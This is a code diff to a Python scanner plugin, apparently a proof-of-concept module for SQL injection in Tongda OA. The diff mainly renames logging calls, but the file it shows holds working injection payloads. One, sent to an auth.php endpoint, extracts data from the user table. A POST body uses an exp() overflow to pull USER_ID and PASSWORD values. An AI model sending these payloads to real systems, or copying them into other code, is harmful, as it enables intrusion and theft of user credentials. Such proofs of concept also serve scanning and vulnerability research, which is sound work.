@@ -8,10 +8,11 @@ from module.plugin import Plugin
 class poc(Plugin):
 
     type = 'CMS'
+    name = 'tongda'
     querytype = 'site'
     description = 'Tongda OA SQL Injection'
     
-    def __init__(self, v):
+    def __init__(self):
     
         self.payload_list = [
         '/interface/auth.php?&PASSWORD=1&USER_ID=%df%27%20and%20(select%201%20from%20(select%20count(*),concat((select%20concat(0x3a,md5(1122),0x3a)%20from%20user%20limit%201),floor(rand(0)*2))x%20from%20%20information_schema.tables%20group%20by%20x)a)%23',
@@ -38,14 +39,14 @@ class poc(Plugin):
             if response:
                 if response.ok:
                     if 'Duplicate' in response.content or 'You have an error in your SQL syntax' in response.content:
-                        self.logger.log(target+str([i]))
+                        self.log.vuln(target+str([i]))
 
         data = {'_SERVER': '', 'rid': 'exp(~(select*from(select concat_ws(0x7c,USER_ID,PASSWORD) from user limit 4,1)x))'}       
         response = self.query(method='POST', url=target+self.payload_1, data=data)
         if response:
             if response.content:
                 if 'out of range' in response.content:
-                    self.logvuln(target+str([13]))
+                    self.log.vuln(target+str([13]))
 
         response = self.query(method='GET', url=target+self.payload_2)  
         if response:
